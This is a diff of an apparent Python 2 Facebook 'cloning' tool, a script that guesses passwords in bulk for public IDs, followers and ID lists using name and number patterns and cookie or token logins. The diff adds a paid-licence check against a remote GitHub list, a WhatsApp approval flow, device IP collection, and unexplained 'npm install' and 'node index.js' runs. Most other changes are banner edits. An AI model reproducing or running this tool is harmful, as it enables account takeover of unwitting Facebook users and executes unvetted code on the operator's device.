@@ -1,7 +1,7 @@
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-_author_ = 'Haris Ali'
+__author__ = 'Haris Ali'
 __copyright = 'All rights reserved . Copyright  Mr Pardesi'
 os.system('termux-setup-storage')
 try:
@@ -21,27 +21,100 @@ os.system('git pull')
 os.system('clear')
 logo = '\n\x1b[1;94m \n\x1b[1;92m Mr Haris\n     \x1b[31;1m[\x1b[43;1m This tool is is Paid \x1b[00;1m\x1b[31;1m ]\n\n     \x1b[32;1mCreator \x1b[37;1m: \x1b[33;1mMr Haris\n     \x1b[32;1mFB ID   \x1b[37;1m: \x1b[33;1mmrharis1\n'
 
+def reg():
+    os.system('clear')
+    print logo
+    print ''
+    print '\x1b[1;32;1m WELCOME TO MY TOOL'
+    print ''
+    time.sleep(1)
+    try:
+        to = open('/sdcard/.Haris.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
 
+    r = requests.get('https://raw.githubusercontent.com/mrpardesi007/kaka/main/server.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        ip()
+    else:
+        os.system('clear')
+        print logo
+        print '\tApproved Failed'
+        print ' \x1b[1;92mYour Id Is Not Approved Already '
+        print ' \x1b[1;92mCopy the id and send to owner'
+        print ' \x1b[1;96mYour id: ' + to
+        raw_input('\x1b[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+923096092417')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print '\tApproval not detected'
+    print ' \x1b[1;92mCopy and press enter , then select WhatsApp to continue'
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    raw_input(' Press enter to go to WhatsApp ')
+    os.system('xdg-open https://wa.me/+923096092417')
+    sav = open('/sdcard/.Adi.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\x1b[1;92m Press enter to check Approval ')
+    reg()
+
+
+def ip():
+    os.system('clear')
+    print logo
+    print '\tCollecting device info'
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\x1b[1;92m Your ip: ' + ips
+    time.sleep(1)
+    print '\x1b[1;92m Your country: ' + country
+    time.sleep(1)
+    print '\x1b[1;92m Your region: ' + regi
+    time.sleep(1)
+    print ' \x1b[1;92mYour network: ' + network
+    time.sleep(1)
+    print ' Loading ...'
+    time.sleep(1)
+    log_menu()
 
 
 #Dev:MR_HARIS
 #### LOGO ####
 logo = """                          
-\033[1;97m *****"***********
-\033[1;97m __       _       ___    _   _      _      _   _                 
-\033[1;97mU|  "\ uU  /"\  u  | " |  |'| |'| U  /"\  u | \ |"|       __      
-\033[1;97m\| |) |/ \/ _ \/     | |   /| || |\ \/ _ \/ <|  \| |>     |"|     
-\033[1;97m|  _/   / __ \    /| |\  U|  _  |u / _ \ U| |\  |u      | |      
-\033[1;97m||     //   \_\  u ||U   || || //   \_\ || \|     U/| |\u    
-\033[1;97m||>>_    \\    >>  // \\  //   \\  \\    >> ||   \\,-.-,|_|,-. 
-\033[1;97m(_))  ()  ()() ()(") (")()  ()(")  (/ \)-' '-(_/  
-\033[1;97m *****************
+\033[1;97m ****************"********************************
+\033[1;97m ____       _       _____    _   _      _      _   _                 
+\033[1;97mU|  _"\ uU  /"\  u  |_ " _|  |'| |'| U  /"\  u | \ |"|       ___      
+\033[1;97m\| |_) |/ \/ _ \/     | |   /| |_| |\ \/ _ \/ <|  \| |>     |_"_|     
+\033[1;97m|  __/   / ___ \    /| |\  U|  _  |u / ___ \ U| |\  |u      | |      
+\033[1;97m|_|     /_/   \_\  u |_|U   |_| |_| /_/   \_\ |_| \_|     U/| |\u    
+\033[1;97m||>>_    \\    >>  _// \\_  //   \\  \\    >> ||   \\,-.-,_|___|_,-. 
+\033[1;97m(__)__)  (__)  (__)(__) (__)(_") ("_)(__)  (__)(_")  (_/ \_)-' '-(_/  
+\033[1;97m *************************************************
 \033[1;93m  [AUTHER]>>>--------------->[HARIS X PATHANI]
-\033[1;95m  [WHATSAPP]>>>---------->[+92309****] 
+\033[1;95m  [WHATSAPP]>>>---------->[+92309******] 
 \033[1;91m  [FACEBOOK]>>>----------->[/HARIS ALI] 
-\033[1;97m ****************
+\033[1;97m ************************************************
 \033[1;93m REMEMBER ME IN YOUR PRAYERS 
-\033[1;97m ****************
+\033[1;97m ************************************************
 """
 
 def log_menu():
@@ -51,7 +124,7 @@ def log_menu():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print '\x1b[1;93m ~~ Login menu ~~\x1b[1;91m'
+        print '\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;92m[1] Login with FaceBook'
         print '\x1b[1;92m[2] Login with token'
@@ -130,7 +203,7 @@ def log_cookie():
            'upgrade-insecure-requests': '1', 
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
            'cache-control': 'max-age=0', 
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
            'content-type': 'text/html; charset=utf-8', 
            'cookie': cookie}
         c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
@@ -242,7 +315,7 @@ def crack():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~ Auto pass cracking ~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -265,7 +338,7 @@ def auto_crack():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~ Auto pass cracking ~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -282,7 +355,7 @@ def a_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Auto pass public cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Auto pass public cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
@@ -291,7 +364,7 @@ def a_s():
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~Auto pass public cracking~'
+            print '\x1b[1;93m~~~~Auto pass public cracking~~~~'
             print ' \x1b[1;92mCloning from: ' + z
         except (KeyError, IOError):
             print '\t Invalid user \x1b[0;97m'
@@ -309,7 +382,7 @@ def a_s():
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Name pass followers cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -324,7 +397,7 @@ def a_s():
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~ Name pass followers cracking ~~'
+            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
             print ' \x1b[1;92mCloning from: ' + z
         except (KeyError, IOError):
             print '\t Invalid user \x1b[0;97m'
@@ -342,7 +415,7 @@ def a_s():
     elif a_s == '3':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Auto pass File cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Auto pass File cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         try:
             idlist = raw_input('[+] File Name: ')
@@ -557,7 +630,7 @@ def crack_b():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~ Number pass cracking ~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -573,13 +646,13 @@ def choice_crack():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Login FB id to continue ~~'
+        print '\x1b[1;93m~~~ Login FB id to continue ~~~'
         time.sleep(1)
         log_menu()
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~ Number pass cracking ~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -596,7 +669,7 @@ def c_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m ~~ Number pass Public cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
         print 47 * '-'
@@ -613,7 +686,7 @@ def c_s():
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m ~~ Number pass Public cracking ~~'
+            print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
             print ' Cloning from: ' + z
         except (KeyError, IOError):
             print '\t Invalid user \x1b[0;97m'
@@ -631,7 +704,7 @@ def c_s():
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Number pass followers cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
         print 47 * '-'
@@ -646,7 +719,7 @@ def c_s():
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~ Number pass followers cracking ~~'
+            print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~'
             print ' Cloning from: ' + z
         except (KeyError, IOError):
             print '\t Invalid user \x1b[0;97m'
@@ -664,7 +737,7 @@ def c_s():
     elif a_s == '3':
         os.system('clear')
         print logo
-        print '\x1b[1;93m ~~ Number pass File cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m ~~~~ Number pass File cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
         print 47 * '-'
@@ -692,7 +765,7 @@ def c_s():
         c_s()
     print ' Total ids: ' + str(len(id))
     time.sleep(0.5)
-    print ' \x1b[1;97m~~ Crack Running ~~\x1b[1;91m'
+    print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
     time.sleep(0.5)
     print 47 * '-'
     print '\t\x1b[1;94m{HARISALI}  {Cloning Tool\x1b[1;91m'
@@ -818,7 +891,7 @@ def crack_b():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~ Name + Number pass cracking ~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -841,7 +914,7 @@ def name_crack():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~ Name + Number pass cracking ~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -858,7 +931,7 @@ def n_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Name + Number pass public cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -877,7 +950,7 @@ def n_s():
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~Name pass public cracking~'
+            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
             print ' \x1b[1;92mCloning from: ' + z
         except (KeyError, IOError):
             print '\t Invalid user \x1b[0;97m'
@@ -895,7 +968,7 @@ def n_s():
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Name pass followers cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -910,7 +983,7 @@ def n_s():
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~ Name pass followers cracking ~~'
+            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
             print ' \x1b[1;92mCloning from: ' + z
         except (KeyError, IOError):
             print '\t Invalid user \x1b[0;97m'
@@ -928,7 +1001,7 @@ def n_s():
     elif a_s == '3':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~ Name + Number pass File cracking ~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -1094,6 +1167,7 @@ def n_s():
         except:
             pass
 
+
     p = ThreadPool(30)
     p.map(main, id)
     print 47 * '-'
@@ -1102,3 +1176,7 @@ def n_s():
     print 47 * '-'
     raw_input(' \x1b[1;93mPress enter to back')
     auto_crack()
+
+
+if __name__ == '__main__':
+    reg()
